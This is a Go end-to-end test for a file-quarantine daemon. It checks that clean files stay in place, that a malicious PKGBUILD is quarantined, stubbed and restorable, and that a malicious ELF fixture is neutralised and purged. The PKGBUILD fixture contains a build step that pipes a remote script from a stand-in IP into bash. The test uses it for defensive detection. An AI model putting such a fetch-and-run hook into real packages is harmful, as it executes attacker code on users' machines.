package main

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"testing"
	"time"

	"github.com/OnlyOneArthur/quarantine-daemon/internal/ipc"
)

func TestLiveBinaryE2E(t *testing.T) {
	// Build binary
	binPath := filepath.Join(t.TempDir(), "quarantined")
	buildCmd := exec.Command("go", "build", "-o", binPath, ".")
	if out, err := buildCmd.CombinedOutput(); err != nil {
		t.Fatalf("go build failed: %v\n%s", err, string(out))
	}

	watchDir := filepath.Join(t.TempDir(), "watch")
	vaultDir := filepath.Join(t.TempDir(), "vault")
	sockDir, err := os.MkdirTemp("", "qsock-*")
	if err != nil {
		t.Fatalf("MkdirTemp sockDir: %v", err)
	}
	defer os.RemoveAll(sockDir)

	sockPath := filepath.Join(sockDir, "q.sock")
	cfgPath := filepath.Join(t.TempDir(), "config.toml")

	if err := os.MkdirAll(watchDir, 0700); err != nil {
		t.Fatalf("mkdir watchDir: %v", err)
	}
	if err := os.MkdirAll(vaultDir, 0700); err != nil {
		t.Fatalf("mkdir vaultDir: %v", err)
	}

	cfgContent := fmt.Sprintf(`
[service]
log_level = "debug"
poll_interval_ms = 50
socket_path = %q

[paths]
watch = [%q]

[triage_binary]
enabled = true

[triage_pkgbuild]
enabled = true

[quarantine]
vault_dir = %q
threshold_score = 85
`, sockPath, watchDir, vaultDir)

	if err := os.WriteFile(cfgPath, []byte(cfgContent), 0600); err != nil {
		t.Fatalf("write config: %v", err)
	}

	cmd := exec.Command(binPath, "-config", cfgPath)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Start(); err != nil {
		t.Fatalf("cmd.Start: %v", err)
	}

	defer func() {
		if cmd.Process != nil {
			_ = cmd.Process.Signal(syscall.SIGTERM)
			_ = cmd.Wait()
		}
	}()

	// Wait for socket to appear
	deadline := time.Now().Add(5 * time.Second)
	var connected bool
	for time.Now().Before(deadline) {
		conn, err := net.Dial("unix", sockPath)
		if err == nil {
			_ = conn.Close()
			connected = true
			break
		}
		time.Sleep(50 * time.Millisecond)
	}
	if !connected {
		t.Fatalf("timed out waiting for socket %s", sockPath)
	}

	client, err := ipc.NewClient(sockPath)
	if err != nil {
		t.Fatalf("ipc.NewClient: %v", err)
	}
	defer client.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	if err := client.Ping(ctx); err != nil {
		t.Fatalf("Ping failed: %v", err)
	}

	status, err := client.GetStatus(ctx)
	if err != nil {
		t.Fatalf("GetStatus: %v", err)
	}
	if status.Version == "" {
		t.Fatalf("expected non-empty version")
	}

	// Test 1: Clean file remains untouched
	cleanPath := filepath.Join(watchDir, "clean.txt")
	if err := os.WriteFile(cleanPath, []byte("benign file contents"), 0644); err != nil {
		t.Fatalf("write clean file: %v", err)
	}
	time.Sleep(200 * time.Millisecond)
	if _, err := os.Stat(cleanPath); err != nil {
		t.Fatalf("clean file was unexpectedly moved or deleted: %v", err)
	}

	// Test 2: Malicious PKGBUILD is quarantined and stubbed
	evilPkgDir := filepath.Join(watchDir, "evil-pkg")
	if err := os.MkdirAll(evilPkgDir, 0755); err != nil {
		t.Fatalf("mkdir evilPkgDir: %v", err)
	}
	evilPkgPath := filepath.Join(evilPkgDir, "PKGBUILD")
	evilPkgContent := `
pkgname=evil
pkgver=1.0
pkgrel=1
arch=('x86_64')
source=("http://198.51.100.1/evil.tar.gz")
md5sums=('SKIP')
build() {
    curl -s http://198.51.100.1/mal.sh | bash
}
`
	if err := os.WriteFile(evilPkgPath, []byte(evilPkgContent), 0644); err != nil {
		t.Fatalf("write evil PKGBUILD: %v", err)
	}

	deadline = time.Now().Add(5 * time.Second)
	var pkgQuarantined bool
	for time.Now().Before(deadline) {
		st, err := client.GetStatus(ctx)
		if err == nil && st.QuarantineCount >= 1 {
			pkgQuarantined = true
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	if !pkgQuarantined {
		t.Fatalf("malicious PKGBUILD was not quarantined within deadline")
	}

	stub, err := os.ReadFile(evilPkgPath)
	if err != nil {
		t.Fatalf("read stub: %v", err)
	}
	if !bytes.Contains(stub, []byte("Quarantined by quarantined daemon")) {
		t.Fatalf("expected stub at evilPkgPath, got: %s", string(stub))
	}

	// Test 3: ListVault & InspectItem
	items, err := client.ListVault(ctx)
	if err != nil {
		t.Fatalf("ListVault: %v", err)
	}
	if len(items) != 1 {
		t.Fatalf("expected 1 item in vault, got %d", len(items))
	}

	meta, err := client.InspectItem(ctx, items[0].ID)
	if err != nil {
		t.Fatalf("InspectItem: %v", err)
	}
	if meta.Score < 85 {
		t.Fatalf("expected score >= 85, got %d", meta.Score)
	}

	// Test 4: RestoreItem
	restoreDest := filepath.Join(t.TempDir(), "restored-PKGBUILD")
	if err := client.RestoreItem(ctx, items[0].ID, restoreDest); err != nil {
		t.Fatalf("RestoreItem: %v", err)
	}
	restoredContent, err := os.ReadFile(restoreDest)
	if err != nil {
		t.Fatalf("read restored file: %v", err)
	}
	if string(restoredContent) != evilPkgContent {
		t.Fatalf("restored content mismatch: got %q, want %q", string(restoredContent), evilPkgContent)
	}

	// Test 5: Verify vault empty after restore
	itemsAfter, err := client.ListVault(ctx)
	if err != nil {
		t.Fatalf("ListVault after restore: %v", err)
	}
	if len(itemsAfter) != 0 {
		t.Fatalf("expected 0 items in vault after restore, got %d", len(itemsAfter))
	}

	// Test 6: Malicious ELF binary quarantine, 0000 mode in vault, and PurgeItem
	elfFixture := filepath.Join("..", "..", "testdata", "binary", "elf_malicious_combined")
	elfBytes, err := os.ReadFile(elfFixture)
	if err != nil {
		t.Fatalf("read elf fixture: %v", err)
	}
	targetELF := filepath.Join(watchDir, "evil_elf")
	if err := os.WriteFile(targetELF, elfBytes, 0755); err != nil {
		t.Fatalf("write evil elf: %v", err)
	}

	deadline = time.Now().Add(5 * time.Second)
	var elfQuarantined bool
	for time.Now().Before(deadline) {
		st, err := client.GetStatus(ctx)
		if err == nil && st.QuarantineCount >= 2 {
			elfQuarantined = true
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	if !elfQuarantined {
		t.Fatalf("malicious ELF binary was not quarantined within deadline")
	}

	// Original path should be gone
	if _, err := os.Stat(targetELF); !os.IsNotExist(err) {
		t.Fatalf("expected evil_elf to be moved from watch dir, err=%v", err)
	}

	vaultItems, err := client.ListVault(ctx)
	if err != nil {
		t.Fatalf("ListVault for elf: %v", err)
	}
	if len(vaultItems) != 1 {
		t.Fatalf("expected 1 item in vault, got %d", len(vaultItems))
	}

	elfArtifact := filepath.Join(vaultDir, vaultItems[0].ID)
	info, err := os.Stat(elfArtifact)
	if err != nil {
		t.Fatalf("stat elf artifact: %v", err)
	}
	if info.Mode().Perm() != 0000 {
		t.Fatalf("expected 0000 neutralized permissions on vault artifact, got %o", info.Mode().Perm())
	}

	// Test 7: PurgeItem
	if err := client.PurgeItem(ctx, vaultItems[0].ID); err != nil {
		t.Fatalf("PurgeItem: %v", err)
	}
	purgedItems, err := client.ListVault(ctx)
	if err != nil {
		t.Fatalf("ListVault after purge: %v", err)
	}
	if len(purgedItems) != 0 {
		t.Fatalf("expected 0 items after purge, got %d", len(purgedItems))
	}

	// Test 8: Graceful shutdown
	if err := cmd.Process.Signal(syscall.SIGTERM); err != nil {
		t.Fatalf("Signal SIGTERM: %v", err)
	}
	if err := cmd.Wait(); err != nil {
		exitErr := &exec.ExitError{}
		if errors.As(err, &exitErr) {
			ws := exitErr.Sys().(syscall.WaitStatus)
			if !ws.Signaled() || ws.Signal() != syscall.SIGTERM {
				t.Fatalf("process exited with unexpected error: %v", err)
			}
		}
	}
	cmd.Process = nil
}
